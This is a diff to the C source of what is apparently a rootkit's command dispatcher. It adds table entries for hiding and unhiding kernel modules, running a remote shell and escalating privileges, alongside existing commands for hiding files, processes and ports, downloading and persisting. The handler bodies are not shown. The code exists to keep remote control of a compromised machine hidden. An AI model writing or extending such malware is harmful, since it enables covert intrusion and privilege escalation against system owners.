@@ -13,23 +13,25 @@ struct rk_dispatch_entry {
 static const struct rk_dispatch_entry dispatch_table[] = {
 	{ "UNHIDE CONTENT ", 15, cmd_unhide_content },
 	{ "HIDE CONTENT ",   13, cmd_hide_content   },
+	{ "UNHIDE MODULE",   13, cmd_unhide_module  },
+	{ "SHELL STATUS",    12, cmd_shell_status   },
 	{ "UNHIDE FILE ",    12, cmd_unhide_file    },
 	{ "UNHIDE PORT ",    12, cmd_unhide_port    },
+	{ "EXEC_SHELL ",     11, cmd_exec_shell     },
+	{ "HIDE MODULE",     11, cmd_hide_module    },
 	{ "UNHIDE PID ",     11, cmd_unhide_pid     },
+	{ "UNHIDE ALL",      10, cmd_unhide_all     },
 	{ "HIDE FILE ",      10, cmd_hide_file      },
 	{ "HIDE PORT ",      10, cmd_hide_port      },
-	{ "HIDE PID ",        9, cmd_hide_pid       },
+	{ "ESCALATE ",        9, cmd_escalate       },
 	{ "DOWNLOAD ",        9, cmd_download       },
-	{ "EXEC ",            5, cmd_exec           },
-	{ "LIST ",            5, cmd_list           },
+	{ "HIDE PID ",        9, cmd_hide_pid       },
 	{ "UNPERSIST",        9, cmd_unpersist      },
-	{ "UNCLOAK",          7, cmd_uncloak        },
-	{ "ESCALATE",         8, cmd_escalate       },
 	{ "PERSIST",          7, cmd_persist        },
 	{ "STATUS",           6, cmd_status         },
-	{ "SHELL",            5, cmd_shell          },
-	{ "CLOAK",            5, cmd_cloak          },
-	{ "PING",             4, cmd_ping           },
+	{ "SHELL ",           6, cmd_shell          },
+	{ "LIST ",            5, cmd_list           },
+	{ "QUIT",             4, cmd_quit           },
 	{ "INFO",             4, cmd_info           },
 };
 
@@ -62,10 +64,7 @@ int rk_dispatch(struct rk_session *s, const u8 *buf, size_t len)
 		if (memcmp(buf, e->prefix, e->prefix_len) != 0)
 			continue;
 
-		// Commands with trailing space in prefix take an argument.
-		// Commands without trailing space must match exactly.
 		if (e->prefix[e->prefix_len - 1] == ' ') {
-			// Has argument: everything after prefix
 			char arg[RK_ARG_MAX];
 			size_t arg_len = len - e->prefix_len;
 
@@ -76,7 +75,6 @@ int rk_dispatch(struct rk_session *s, const u8 *buf, size_t len)
 			return e->handler(s, arg);
 		}
 
-		// Exact match required
 		if (len == e->prefix_len)
 			return e->handler(s, NULL);
 	}
